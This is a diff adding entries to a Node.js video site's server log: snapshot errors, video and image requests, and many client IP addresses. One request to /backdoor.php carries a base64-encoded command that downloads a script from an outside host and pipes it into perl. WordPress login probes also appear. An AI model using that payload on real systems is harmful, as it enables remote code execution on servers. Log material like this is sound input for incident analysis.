@@ -1310,3 +1310,399 @@ CopyFile, functions.js
 CopyFile, functions.js
 CopyFile, functions.js
 CopyFile, functions.js
+Server started
+deleteExistingSnapshots
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/1789272.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/1789272.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/1882209.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/1882209.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/3155763.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/3155763.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/4029942.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/4029942.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/4500219.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/4500219.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/5305997.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/5305997.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/5634978.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/5634978.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/6023023.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/6023023.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/8999949.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/8999949.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/9615143.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/9615143.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/9740925.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/9740925.jpg' }
+generateAllSnapshots
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+done
+done
+done
+done
+done
+done
+done
+done
+done
+done
+done
+Server started
+deleteExistingSnapshots
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/1789272.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/1789272.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/1882209.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/1882209.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/3155763.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/3155763.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/4029942.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/4029942.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/4500219.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/4500219.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/5305997.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/5305997.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/5634978.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/5634978.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/6023023.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/6023023.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/8999949.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/8999949.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/9615143.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/9615143.jpg' }
+{ Error: ENOENT: no such file or directory, unlink '/home/new-coolvideos/server/upload/snapshots/9740925.jpg'
+  errno: -2,
+  code: 'ENOENT',
+  syscall: 'unlink',
+  path: '/home/new-coolvideos/server/upload/snapshots/9740925.jpg' }
+generateAllSnapshots
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+generateSnapshot
+done
+done
+done
+done
+done
+done
+done
+done
+done
+done
+done
+Req: /favicon.ico from ::ffff:92.185.107.94
+Req: /images/agario.png from ::ffff:181.65.66.153
+Req: /favicon.ico from ::ffff:31.4.139.107
+Req: /images/agario.png from ::ffff:168.235.206.191
+Req: /images/agario.png from ::ffff:168.235.206.191
+Req: /images/agario.png from ::ffff:88.24.200.206
+Req: /images/agario.png from ::ffff:181.93.145.153
+Req: /images/agario.png from undefined
+Req: /images/agario.png from ::ffff:186.159.62.51
+Req: /images/agario.png from ::ffff:190.200.176.182
+Req: /images/agario.png from ::ffff:189.217.203.21
+Req: /index.php from ::ffff:189.217.203.21
+Req: /favicon.ico from ::ffff:189.217.203.21
+Req: /images/agario.png from ::ffff:200.95.8.254
+Req: /api/get-all-videos from ::ffff:86.135.106.208
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /favicon.ico from ::ffff:86.135.106.208
+Req: /images/agario.png from ::ffff:192.99.149.144
+Req: /images/agario.png from ::ffff:186.150.223.42
+Req: /images/agario.png from ::ffff:186.150.223.42
+Req: / from ::ffff:223.255.145.158
+Req: /backdoor.php?cmd=d2dldCAtcU8gLSBodHRwOi8vcGFsbWlyYXBsdXMua3ovLm1haWwgfCBwZXJs from ::ffff:223.255.145.158
+Req: /images/agario.png from ::ffff:73.198.84.198
+Req: /images/agario.png from ::ffff:73.198.84.198
+Req: /images/agario.png from ::ffff:181.226.207.2
+Req: /images/agario.png from ::ffff:187.188.154.106
+Req: /images/agario.png from ::ffff:186.145.190.173
+Req: /images/agario.png from ::ffff:186.145.190.173
+Req: /images/agario.png from ::ffff:177.237.8.68
+Req: /images/agario.png from ::ffff:177.237.8.68
+Req: /images/agario.png from ::ffff:179.52.89.54
+Req: /images/agario.png from ::ffff:179.52.89.54
+Req: /api/get-all-videos from ::ffff:73.137.220.28
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /favicon.ico from ::ffff:73.137.220.28
+Req: /api/video/9740925.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/9615143.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/5305997.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/6023023.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/get-all-videos from ::ffff:73.137.220.28
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /favicon.ico from ::ffff:73.137.220.28
+Req: /api/video/4029942.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/8999949.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/5634978.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/1789272.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/video/1882209.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /api/get-all-videos from ::ffff:73.137.220.28
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /favicon.ico from ::ffff:73.137.220.28
+Req: /api/video/6023023.mp4 from ::ffff:73.137.220.28
+GetVideo
+CopyFile, functions.js
+Req: /images/agario.png from ::ffff:201.172.65.127
+Req: /api/get-all-videos from ::ffff:107.135.63.147
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /robots.txt from ::ffff:46.229.164.98
+Req: /images/agario.png from ::ffff:186.50.153.34
+Req: /images/agario.png from ::ffff:177.237.30.9
+Req: /images/agario.png from ::ffff:190.18.227.124
+Req: /images/agario.png from ::ffff:177.237.30.9
+Req: /wp-login.php from ::ffff:199.15.233.176
+Req: //wp-login.php from ::ffff:199.15.233.176
+Req: /api/get-all-videos from ::ffff:86.98.52.141
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /api/video/5634978.mp4 from ::ffff:86.98.52.141
+GetVideo
+CopyFile, functions.js
+Req: /api/video/8999949.mp4 from ::ffff:86.98.52.141
+GetVideo
+CopyFile, functions.js
+Req: /api/video/1789272.mp4 from ::ffff:86.98.52.141
+GetVideo
+CopyFile, functions.js
+Req: /images/agario.png from ::ffff:167.114.1.185
+Req: /api/get-all-videos from ::ffff:46.154.215.7
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /favicon.ico from ::ffff:46.154.215.7
+Req: /api/video/5305997.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/6023023.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/9740925.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/9615143.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/9615143.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/8999949.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/6023023.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/5634978.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/4029942.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /api/video/1789272.mp4 from ::ffff:46.154.215.7
+GetVideo
+CopyFile, functions.js
+Req: /images/agario.png from ::ffff:167.114.1.185
+Req: /images/agario.png from ::ffff:190.136.198.130
+Req: /images/agario.png from ::ffff:167.57.216.207
+Req: /api/get-all-videos from ::ffff:92.185.107.94
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /api/video/9615143.mp4 from ::ffff:92.185.107.94
+GetVideo
+CopyFile, functions.js
+Req: /api/get-all-videos from ::ffff:92.185.107.94
+getAllSnapshots
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+CopyFile, functions.js
+Req: /images/agario.png from ::ffff:177.244.214.124
